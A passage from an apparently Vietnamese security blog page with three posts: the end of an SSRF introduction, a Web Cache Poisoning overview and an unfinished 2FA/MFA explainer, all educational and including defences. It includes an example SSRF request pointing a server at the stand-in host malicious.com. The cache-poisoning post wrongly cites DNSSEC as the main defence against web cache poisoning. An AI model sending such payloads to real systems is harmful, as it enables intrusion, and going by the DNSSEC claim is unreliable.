<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image-6.png" alt="" class="wp-image-117"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Nhìn vào hình bên trên, nó sẽ giải thích cách tấn công SSRF, attacker sẽ gửi một URL có chứa payload tới nơi có chứa lỗ hổng trên web app thông qua Request A.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p><em>GET payload/return?url=</em><a rel="noreferrer noopener" href="http://malicious.com/" target="_blank"><em>http://malicious.com/</em></a><em>&nbsp;HTTP/1.1<br>Host: victim.com</em></p><cite>Ví dụ</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Trong yêu cầu trên, chúng ta có thể thấy máy chủ lưu trữ là victim.com và yêu cầu GET đang lấy tham số của "url" , tham số của url không được kiểm soát .Lúc này webapp sẽ lấy giá trị của "url" để tạo ra một request khác (Request B) tới "http://malicious.com" . Máy chủ lúc này sẽ nhận và xử lý việc thực hiện request B .Tiếp tục webapp lúc này sẽ hiển thị một số hoặc toàn bộ kết quả trả về máy chủ , dựa vào đó attacker có thể truy cập dữ liệu trái phép hoặc thực hiện các cuộc tấn công khác như :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Port Scanning</li><li>Denial of Service</li><li>Tấn công vào các ứng dụng khác trong hệ thống bằng các kĩ thuật như Buffer Overflow</li><li><a href="http://hydrasky.ml/2020/03/cross-site-scripting-part1" target="_blank" rel="noopener">Cross Site Script</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Thông thường SSRF đều có thể tồn tại trong những mục có liên quan đến path url như  redirect, file path ...</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://miro.medium.com/max/1368/1*FVIKVlXUN8_WqiVAmwM5GA.png" alt="Kết quả hình ảnh cho ssrf exploit"/><figcaption>Ví dụ SSRF</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Trường hợp đặc biệt, webapp không trả về bất kì điều gì dấu hiệu gì thì vẫn có khả năng tồn tại lỗ hổng được gọi là Blind SSRF. Để xác định Blind SSRF bạn cần phải có một server bên ngoài mở một port bất kì và set payload của bạn về địa chỉ với port đang lắng nghe của server.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":118,"width":592,"height":104,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/03/image.jpeg" alt="Kết quả hình ảnh cho ssrf via dns rebinding" class="wp-image-118" width="592" height="104"/><figcaption>Ví dụ SSRF</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Hoặc đơn giản nhất bạn có thể dùng Burp Collaborator được tích hợp trong Burpsuite (Công cụ của PortSwigger) - <a href="https://portswigger.net/burp/documentation/collaborator" target="_blank" rel="noopener">Link hướng dẫn</a> .</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://static.packt-cdn.com/products/9781789531732/graphics/61e54233-2d8a-4ed6-aee1-2e4e10e77780.png" alt="Kết quả hình ảnh cho Burp Collaborator"/><figcaption>Burp Collaborator</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Cách ngăn chặn phòng chống SSRF</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Việc sử dụng blacklist và regular expressions để kiểm soát đầu vào rất khó và không hữu hiệu. Sử dụng backlist có thể ảnh hưởng đến các chức năng và công việc. Còn regular expressions thì cũng rất dễ để hacker tìm cách bypass như  <a href="http://www.pc-help.org/obscure.htm" target="_blank" rel="noopener">Malicious URL’s Using DWORD Formatted IP&nbsp;Addresses </a>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Phương pháp hiệu quả để tránh SSRF là liệt kê danh sách tên DNS hoặc địa chỉ IP mà ứng dụng của bạn cần truy cập (Whitelist). Thực chất SSRF không có bản sửa lỗi cụ thể vì nó phụ thuộc nhiều vào chức năng ứng dụng và yêu cầu kinh doanh. Việc sử dụng một loại list rất khó để bảo vệ nên kết hợp Backlist với whitelist  nhưng điều quan trọng là phải xác thực hợp lệ đầu vào của người dùng.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Không những phải kiểm xoát đầu vào bạn cần phải kiểm soát dữ liệu trả về cho người dùng.Để ngăn chặn dữ liệu phản hồi rò rỉ cho kẻ tấn công, phải đảm bảo rằng phản hồi nhận được như ý muốn.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Kẻ tấn công thường dùng<a href="https://en.wikipedia.org/wiki/List_of_URI_schemes" target="_blank" rel="noopener"> URL schemas</a> để khai thác hệ thống thông qua lỗ hổng SSRF vì vậy nên vô hiệu hóa một số URL schemas như file:///, dict://, ftp:// và gopher://.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Kẻ tấn công có thể sử dụng lỗ hổng Server Side Request Forgery để truy cập một số dịch vụ này mà không cần bất kỳ xác thực nào.&nbsp;Do đó, để đảm bảo bảo mật ứng dụng web, tốt nhất là cho phép xác thực bất cứ nơi nào có thể, ngay cả đối với các dịch vụ trên mạng cục bộ.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Trong phần tiếp theo mình sẽ phân tích rõ các cách thức tấn công qua lỗ hổng này !</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Link tham khảo </h4>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</a></li><li><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">https://portswigger.net/web-security/ssrf</a></li><li>Mastering Modern Web Penetration Testing Book - Prakhar Prasad</li></ul>
<!-- /wp:list -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/" data-id="ckbgpmbc00001qxjm42xr9x14" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Web Cache Poisoning  (Part 1)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/">Web Cache Poisoning (PART 1)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Là một trong những lỗ hổng yêu thích nên mình sẽ viết hơi dài dòng một chút nên phần này mình dành cho những bạn nào mới tìm hiểu nha . Trong phần này mình sẽ giới thiệu về web cache poisoning và yếu tố dẫn đến lỗ hổng cùng mốt số cách khai thác.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ngay khi bước vào tìm hiểu về web security chắc chắn sẽ ít ai để ý đến lỗ hổng này. Thậm trí trong các tài liệu và trong các khóa học đề cập rất ít đến nó nên vì thế lúc đầu  mình cũng không quan tâm cho lắm.Khi tìm hiểu về HTTP request Smuggling/ Response Splitting (lỗ hổng mình yêu thích ) thú vị thay mình tìm hiểu được về WCP. Nó rất thú vị như <a href="https://twitter.com/albinowax" target="_blank" rel="noreferrer noopener" aria-label="James Kettle (opens in a new tab)">James Kettle</a> nói !!! </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Đầu tiên, cần phải biết web cache và cache key là gì đã ? Nếu bạn chưa biết bạn có thể tham khảo một <a href="http://hydrasky.ml/2020/03/web-cache" target="_blank" rel="noopener">bài viết </a>của mình.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Web cache poisoning là gì ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Cứ theo tiếng anh mà dịch thì bạn cx đã hiểu được một phần rồi "Đầu độc web cache". Bằng cách khai thác một sô vấn đề của máy chủ và lợi dụng cache để phản hồi lại các HTTP reponse có nội dung độc hại từ kẻ tấn công cho người khác.Và đặc biệt lỗ hổng này có thể ảnh hưởng với quy mô rộng  lớn khác với lại các lỗ hổng cùng họ như Web Cache Deception.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Theo như mình tìm kiếm được , WCP  đã được đề cập trong danh sách lỗ hổng từ năm 2009 của OWASP với một cái tên  "<a rel="noreferrer noopener" aria-label="Cache Poisoning (opens in a new tab)" href="https://owasp.org/www-community/attacks/Cache_Poisoning" target="_blank">Cache Poisoning</a>" (Nghe rất chung chung bởi còn một số kiểu  cache poisoning khác thì sao như DNS cache poisoning-MITM ...) . Điều thú vị nữa là vào thời điểm này người ta cho rằng lỗ hổng này chỉ ở mức "lý thuyết" (theoretical) khó thể khai thác thực tế. Và rồi đến năm 2018 , James Kettle là một chuyên gia, giám đốc mảng Web Security của <a rel="noreferrer noopener" aria-label="Portswigger  (opens in a new tab)" href="https://portswigger.net/about" target="_blank">Portswigger</a> đã có một bài thuyết trình  về lỗ hổng này <a href="https://portswigger.net/research/practical-web-cache-poisoning" target="_blank" rel="noopener">Practical Web Cache Poisoning: Redefining 'Unexploitable'</a> <a href="https://www.youtube.com/watch?v=j2RrmNxJZ5c" target="_blank" rel="noopener">[Video]</a> của <a href="https://twitter.com/albinowax" target="_blank" rel="noopener">James Kettle</a> trong sự kiện bảo mật thông tin hàng đầu trên thế giới "Blackhat"  và James Kettle đã chững minh cho tất cả thấy rằng Web Cache Poisoning là  "not theoretical ". Các bạn nên xem để hiểu rõ hơn.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://infosec-conferences.com/wp-content/uploads/2019/11/logo-conference-series-blackhat-v1.png" alt=""/><figcaption>Logo của sự kiện BlackHat</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Và mình sẽ phân tích lỗ hổng này dựa vào bài thuyết trình của James Kettle. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Một vài điểm lưu ý ở lỗ hổng này ?</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Xét về tính chất của cache thì ta chia ra làm 2 loại là private cache và pubic (shared) cache. Private cache là cache được lưu trữ phía client (brower cache), được lưu cục bộ  còn public cache là nằm giữa client và server (proxy cache). Với lỗ hổng WCP thì chúng ta chỉ quan tâm  tới việc làm sao đầu độc public cache từ đó tấn công ảnh hưởng đến toàn bộ người dùng cùng proxy cache đó còn Private cache không liên quan.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lỗ hổng quan tâm đến <a rel="noreferrer noopener" aria-label="Cache key (opens in a new tab)" href="http://hydrasky.ml/2020/03/web-cache" target="_blank">Cache key</a> , việc attacker xác định được cache key sẽ tăng khả năng bị tấn công. Ví dụ:</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.imgur.com/wNyvExv.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Cache keys ở đây là phần bôi cam cam ở trên, nếu request nào match 2 cái đó thì resource từ cache sẽ được trả về với nội dung bằng tiếng Anh (en)</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tương tự như vậy nếu ta request tiếp nhưng thay đổi ngôn ngữ là tiếng Ba Lan: </p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://i.imgur.com/EbyDbkN.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cache sẽ so sách cache key và thấy match 2 cái key đó sẽ lại trả nội dung về nhưng không phải là tiếng Ba Lan mà vẫn là tiếng Anh. Trườn hợp nguy hại hơn là một payload độc hại hay một file javascript có chứa lỗ hổng đã được caching cho request trước thì các người dùng sau sẽ đều bị ảnh hưởng cho đến khi một response mới được lưu. Điều đó sẽ có thể dẫn đến lỗ hổng Cache Poisoning. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Cách thức tấn công</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p> Về cơ bản, Web cache poisoning bao 3 bước. </p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Đầu tiên, kẻ tấn công phải tìm ra cách tạo ra response từ máy chủ back-end  bằng cách sử tìm thử các input không phải "cache key".</li><li>Tiếp theo là xem những chỗ input đó có thành lỗi được không.</li><li>Cuối cùng nếu có thì bắt đầu poison shared cache.  </li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Xác định và đánh giá các input không phải key</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Bất kỳ cuộc tấn công WCP nào đều phụ thuộc vào các input không phải key, chẳng hạn như các tiêu đề (header) . Bộ đệm web bỏ qua các đầu vào không phải key hoặc không bị khóa khi quyết định có nên trả về response được lưu trong bộ nhớ cache cho người dùng hay không. Điều có nghĩa là bạn có thể sử dụng các đầu vào không bị khóa để gửi payload của mình và tạo ra response bị "poisoned", nếu được lưu trong bộ nhớ cache, sẽ được trả về cho tất cả người dùng có yêu cầu có khóa bộ đệm tương ứng. Do đó, bước đầu tiên của cuộc tấn công WCP là xác định các đầu vào không bị khóa được máy chủ sử dụng .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Bạn có thể xác định các đầu vào một cách thủ công bằng cách thêm các header vào các request và quan sát xem chúng có ảnh hưởng đến response hay không. Bạn có thể sử dụng các công cụ có khả năng chặn bắt và thay đổi gói tinh như <a rel="noreferrer noopener" aria-label="Burp Suite (opens in a new tab)" href="https://portswigger.net/burp/communitydownload" target="_blank">Burp Suite</a> của PortSwigger hoặc <a rel="noreferrer noopener" aria-label="ZAP  (opens in a new tab)" href="https://www.zaproxy.org/download/" target="_blank">ZAP </a>của OWASP. Cách có thể rất trực quan nhưng nó đòi hỏi nhiều công sức và thời gian. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","width":399,"height":263} -->
<div class="wp-block-image"><figure class="aligncenter is-resized"><img src="https://www.vietsunshine.com.vn/wp-content/uploads/2018/09/H%C6%B0%E1%BB%9Bng-d%E1%BA%ABn-Pentest-Black-Box-s%E1%BB%AD-d%E1%BB%A5ng-Burp-Suite-Ph%E1%BA%A7n-1-1.jpg" alt="Hướng dẫn Pentest Black Box sử dụng Burp Suite (Phần 1)" width="399" height="263"/><figcaption>Burp Suite</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Thay vì vậy bạn có thể sử dụng các công cụ hỗ trợ như <a rel="noreferrer noopener" aria-label="Acunetix  (opens in a new tab)" href="https://www.acunetix.com/" target="_blank">Acunetix </a>- Scan lỗ hổng web tự động nhưng ta sẽ hơi bị động, <a rel="noreferrer noopener" aria-label="Param Miner (opens in a new tab)" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943" target="_blank">Param Miner</a> - một extention của Burp Suite giúp xác định các tham số (parm) bị ẩn, không liên  kết, đặc biệt hữu ích để tìm lỗ hổng độc hại bộ đệm web. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Mình khuyến khích các bạn nên dùng Burp Suite, nó thực sự hiệu quả.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Tìm ra mục độc hại trong các phản hồi từ server của mỗi input</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Khi bạn đã xác định được đầu vào không phải key hoặc không bị khóa, bước tiếp theo là đánh giá chính xác cách trang web xử lý nó. Hiểu điều này là điều cần thiết để có thể tạo ra response độc hại. Nếu như giá trị từ đầu vào được nằm trong response từ máy chủ mà không bị loại bỏ hoặc được sử dụng tạo đường dẫn đến dữ liệu khác (<strong>Host Header Attack</strong>), thì đây là yếu tố có khả năng để làm ngộ độc web cache.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Lấy phản hồi được lưu trữ</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Bước này chỉ là để kiểm tra việc đầu độc web cache đã thành công hay chưa. Việc đầu độc cache chiếm 50% tỉ lệ thành công còn lại phụ thuộc vào nhiều yếu tố khác như extention của file,content type, router,status code và response header.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Bạn nên dành một chút thời gian để tìm hiểu về các header, các request đến các server khác nhau  và nghiên cứu cách bộ đệm hoạt động thì việc hiểu và thực hiện tấn công sẽ dễ dàng hơn.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Các mối đe dọa có thể xảy ra ?</h4>
<!-- /wp:heading -->

<!-- wp:image {"width":592,"height":159} -->
<figure class="wp-block-image is-resized"><img src="https://portswigger.net/web-security/images/cache-poisoning.svg" alt="web cache poisoning" width="592" height="159"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> Như với hầu hết các loại tấn công,  Web cache poisoning  cũng có thể được sử dụng kết hợp với các cuộc tấn công khác để leo thang tác động lớn hơn nữa ví dụ các lỗ hổng phổ biến như XSS, JavaScript inject, Open redirect, v.v. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Response độc hại chỉ ảnh hưởng đến người dùng truy cập trang bị ảnh hưởng trong khi cache bị đầu độc. Do đó, tác dộng có thể dao động từ không tồn tại đến lớn tùy thuộc vào việc trang có phổ biến hay không. Ví dụ, nếu kẻ tấn công quản lý để đầu độc một phản hồi được lưu trong bộ nhớ cache trên trang chủ của một trang web lớn như Facebook , thì cuộc tấn công có thể ảnh hưởng đến hàng ngàn người dùng mà không có bất kỳ tương tác nào sau đó từ kẻ tấn công. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Cách thức ngăn chặn lỗ hổng này</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Về vấn dề ngăn chặn lỗ hổng này mình không tìm được nhiều tài liệu chi tết. chỉ trung trung vào việc cấu hình năng cao cho việc lưu trữ vào cache trên server nhưng vấn đề còn phụ thuộc vào mục đích , công việc kinh doanh và do bên thứ 3 như các CDN.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p> Ngoài ra còn có các công cụ có sẵn để giúp các tổ chức ngăn chặn các cuộc tấn công ngộ độc cache. Công cụ ngăn chặn ngộ độc bộ nhớ cache phổ biến nhất có lẽ là DNSSEC ( Domain Name System Security Extension). DNSSEC là một công cụ chống độc cache được phát triển bởi Lực lượng đặc nhiệm kỹ thuật Internet ( &nbsp;Internet Engineering Task Force ) để cung cấp xác thực dữ liệu DNS an toàn. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Ok như vậy là minh đã xong phần giới thiệu về lỗ hổng Web Cache Poisoning , trong phần tiếp theo mình sẽ trình bày các kĩ thuật và cách đầu độc Cache. Cảm ơn và mời các bạn đón đọc!!!! Bye</p>
<!-- /wp:paragraph -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/Web%20Cache%20Poisoning%20%20(Part%201)/" data-id="ckbgpmbcp000hqxjm01hy005a" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Server/" rel="tag">Web Server</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-authen" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/authen/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/authen/">Two-Factor Authentication &amp; Multil-Factor Authentication</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:paragraph -->
<p>Xin chào các bạn , trong bài viết này mình sẽ giới thiệu về 2 phương thức bảo mật được ưa dùng hiện nay, cách thức hoạt động và mức độ quan trọng hay ảnh hướng như nào đến người dùng khi không dùng hay bị bypass.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Như các bạn đều biết việc xác thực cổ điện là dựa vào user/password là một phương thức đã lỗi thời và rất dễ bị bẻ khóa.  Cùng với đó gười dùng thường có thói quen dùng một mật khẩu cho nhiều tài khoản hay sử dụng mật khẩu đơn giản để dễ nhớ. Dẫn đến việc kể tấn công có thể đoán ra hay sử dụng các công cụ để thực hiện cuộc tấn công bruteforce hoặc diretory attack chiếm lấy tài khoản một cách dễ dàng. Vì vậy điều cần thiết được đặt ra  là cung cấp cho người dùng những cách bổ sung để bảo vệ tài khoản của họ.&nbsp;<a rel="noreferrer noopener" href="https://www.loginradius.com/blog/2019/01/how-do-i-know-if-my-email-has-been-leaked-in-a-data-breach/" target="_blank"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Xác thực hai yếu tố hay đa yếu tố (2FA hoặc MFA) là phương thức bảo mật mới đã được bổ sung vào quá trình xác thực  và ngày càng trở nên phổ biến.&nbsp;&nbsp;Vậy 2FA và MFA là gì và chúng có thể giúp bảo vệ người dùng như thế nào?</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Two-Factor (2FA) và Multi-Factor Authentication hay còn gọi là Bảo mật nhiều lớp, là một phương thức để chứng thực user bằng việc combine 2 hoặc nhiều hơn các factors khác nhau.&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Thực ra Two-Factor Authentication (2FA) - cũng được coi là Multi-Factor authentication (MFA) nhưng MFA lại không phải là 2FA, Tại sao lại vậy ???</strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":302,"width":532,"height":207,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-1.png" alt="Multi-Factor Authentication Vs Two-Factor Authentication | REVE Secure" class="wp-image-302" width="532" height="207"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sự khác biệt dễ thấy nhất giữa xác thực đa yếu tố và xác thực hai yếu tố là 2FA chỉ sử dụng hai trong số các yếu tố có sẵn để xác minh danh tính người dùng, trong khi MFA có thể sử dụng ba hoặc nhiều hơn để kiểm tra.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Xét về tính bảo mật, mặc dù 2FA hiện vẫn đang là phương thức xác thực rất là hữu hiệu nhưng không phải là an toàn thực sự. Đã có rất nhiều cách bypass 2FA  được thực hiện, mặc dù hầu hến đến từ việc cấu hình của người quản trị hoặc đôi khi từ chính sự thiếu hiểu biết từ người dùng nhưng rõ ràng rằng 2FA không còn đủ để ngăn chặn hoàn toàn các vi phạm dữ liệu và đó là lí do sinh ra MFA. MFA không chỉ sử dụng nhiều yếu tố xác thực có sẵn mà nó còn bổ sung thêm các yếu tố  theo ngữ cảnh như thời gian,vị trí ...</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://image.slidesharecdn.com/smspasscode-141101172311-conversion-gate02/95/welcome-to-the-3rd-generation-in-user-authentication-7-638.jpg?cb=1414931604" alt="Welcome to the 3rd generation in user authentication"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Oh như  vậy tại sao vẫn sử dụng 2FA khi đã có MFA ? Dễ hiểu thôi , nhiều xác thực hơn có nghĩa là bảo mật hơn nhưng sẽ phức tạp hơn ,người dùng có thể thấy rất khó chịu với việc này nên các ứng dụng nhỏ và vừa thường sử dụng 2FA cùng với các yếu tố xác thực  mức độ tốt hơn thay vì sử dụng nhiều yếu tố để xác thực như MFA. Còn với các ông lớn như Facebook, Google ... đều đã áp dụng MFA cho người dùng tùy chọn và MFA rất cần thiết cho lưu trữ đám mây (Cloud).</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Các yếu tố xác thực chính</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://www.secsign.com/wp-content/uploads/2017/08/2FA-icon.png" alt="Two-Factor Authentication (2FA) vs. Two-Step Authentication (2SA ..."/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Nếu không dựa vào mật khẩu vậy phương thức này sẽ sử dụng điều gì để xác thực ? Có thể kể đến 4 yếu tố :</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Kiến thức hay sự hiểu biết</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Ví dụ là sử dụng tính năng xác thực bằng bạn bè , như zalo sẽ yêu cầu bạn chọn dúng 3 tài khoản  trong danh sách bạn bè để xác thực đó chính là bạn. Kiến thức ở đây là một cái gì đó nằm trong kiến thức liên quan đến tài khoản của người dùng.&nbsp;Đây có thể là mật khẩu, tên người dùng,bạn bè, câu trả lời cho câu hỏi bảo mật mà bạn đặt sẵn, mã PIN hoặc địa chỉ. </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Sở hữu</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Loại yếu tố xác thực này đề cập đến thứ mà người dùng sở hữu, thiết bị (chỉ cho phép đăng nhập  ở điện thoại hoặc máy tính của bạn )hoặc đối tượng sẽ cung cấp thêm thông tin cần thiết để xác minh (email, sdt) . Ví dụ như mã OTP được gửi qua SMS hoặc các ừng dụng token, token secret qua email...</p>
<!-- /wp:paragraph -->

<!-- wp:image {"align":"center","id":301,"width":276,"height":402,"sizeSlug":"large"} -->
<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image.png" alt="" class="wp-image-301" width="276" height="402"/><figcaption>Software tokens</figcaption></figure></div>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>Cố Hữu (Vốn có)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Đây là những yếu tố liên quan đến người dùng và thường là các phương pháp sinh trắc học như nhận dạng vân tay , khuôn mặt , giọng nói hoặc mống mắt . </p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Vị trí</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Mặc dù yếu tố xác thực vị trí có thể không được sử dụng thường xuyên như các yếu tố khác, tuy nhiên nó vẫn tạo thành một yếu tố để xác thực hữu hiệu.&nbsp;Theo định nghĩa, nó đề cập đến bạn đang ở đâu.&nbsp;Vị trí của bạn được theo dõi và xác định bằng các công nghệ khác nhau theo dõi địa chỉ IP của bạn và họ thông báo cho bạn nếu họ phát hiện ra việc truy cập ở một vị trí bất thường (VD: bạn ở HN nhưng tài khoản lại được truy cập ở HCM) .Xác định vị trí của bạn cũng có thể được thực hiện bằng địa chỉ MAC hoặc thiết bị có trình theo dõi GPS.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Cơ chế hoạt động internally của 2FA</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Khi bạn enable 2FA cho tài khoản của mình,mỗi lần yêu cầu xác thực 2fa, bạn sẽ nhận được một secret key based 32. Tùy vào mức độ security, độ dài của secret key có thể là 80, 128 hoặc 160 bit.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Các authenticator application sẽ scan secret này dưới dạng QR code (hoặc manually) và dùng nó để generate ra một HMAC-SHA1. Chuỗi HMAC này có thể là một trong 2 dạng:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm" target="_blank" rel="noopener">TOTP</a></li><li><a href="https://en.wikipedia.org/wiki/HMAC-based_One-time_Password_algorithm" target="_blank" rel="noopener">HOTP</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Sau đó HMAC này sẽ được extracted và lấy ra 1 số int 4 byte, đó chính là code.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Một mã code sẽ valid trong 30 giây. Tuy nhiên không phải ai cũng có clock synced giống nhau, vì network latency các kiểu nên thường mọi người hay cho phép ở phạm vi cộng trừ 1 code, tức là 1 code sẽ valid trong 1 phút 30 giây. Điều này có thể giảm tính an toàn, nhưng lại tăng sự trải nghiệm đáng kể.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Backup codes</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Backup codes hay recovery codes sẽ được sử dụng trong trường hợp bạn không thể sử dụng điện thoại, bạn có thể dùng chúng để đăng nhập. Có 2 loại backup codes:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Multiple backup codes: Ví dụ github sẽ cho bạn 10 codes, và mỗi code sẽ được sử dụng 1 lần.</li><li>Single backup code: Bạn dùng cái code này đồng nghĩa với việc bạn có thể đăng nhập, nhưng phải setup lại 2FA (nó assume bạn bị mất điện thoại).</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>Quy trình xác thực bằng 2FA</h3>
<!-- /wp:heading -->

